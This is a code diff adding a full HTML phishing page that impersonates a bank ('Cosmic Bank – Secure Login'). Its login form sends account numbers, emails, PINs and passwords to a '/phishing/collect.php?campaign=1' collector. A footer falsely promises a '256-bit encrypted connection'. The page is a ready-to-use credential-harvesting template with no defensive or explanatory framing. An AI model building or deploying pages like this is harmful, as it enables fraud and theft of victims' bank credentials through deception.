@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Bank – Secure Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        /* Cosmic bank theme with gold accents */
+        :root {
+            --cosmic-bg: #0a0a0f;
+            --cosmic-glass: rgba(20, 10, 30, 0.7);
+            --cosmic-gold: #ffd700;
+            --cosmic-neon-blue: #00f3ff;
+            --cosmic-neon-purple: #b300ff;
+            --cosmic-glow: 0 0 20px rgba(255, 215, 0, 0.4);
+            --cosmic-border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: radial-gradient(ellipse at bottom, #1a0f0a 0%, #030307 100%);
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container { width:100%; max-width:400px; margin:20px; }
+        .glass-panel {
+            background: var(--cosmic-glass);
+            backdrop-filter: blur(12px);
+            border: var(--cosmic-border);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6), var(--cosmic-glow);
+        }
+        h1 { color: var(--cosmic-gold); text-align:center; margin-bottom:30px; letter-spacing:4px; border-bottom:2px solid var(--cosmic-neon-purple); padding-bottom:15px; }
+        .form-group { margin-bottom:20px; }
+        label { display:block; color: var(--cosmic-gold); margin-bottom:5px; }
+        input { width:100%; padding:12px 16px; background:rgba(0,0,0,0.5); border:1px solid var(--cosmic-gold); border-radius:30px; color:#fff; font-family:inherit; }
+        input:focus { outline:none; border-color: var(--cosmic-neon-blue); box-shadow:0 0 15px var(--cosmic-neon-blue); }
+        .btn { width:100%; padding:14px; background:transparent; color:var(--cosmic-gold); border:2px solid var(--cosmic-gold); border-radius:40px; font-size:1.2em; cursor:pointer; margin-top:10px; }
+        .btn:hover { background:var(--cosmic-gold); color:#000; box-shadow:0 0 30px var(--cosmic-gold); }
+        .footer { text-align:center; margin-top:30px; color:#888; font-size:0.8em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="glass-panel">
+            <h1>🏦 COSMIC BANK</h1>
+            <form action="/phishing/collect.php?campaign=1" method="post">
+                <input type="hidden" name="page" value="bank">
+                <div class="form-group">
+                    <label>Account Number / Email</label>
+                    <input type="text" name="account" required>
+                </div>
+                <div class="form-group">
+                    <label>PIN / Password</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit" class="btn">LOGIN</button>
+            </form>
+            <div class="footer">⚡ 256‑bit encrypted connection</div>
+        </div>
+    </div>
+</body>
+</html>
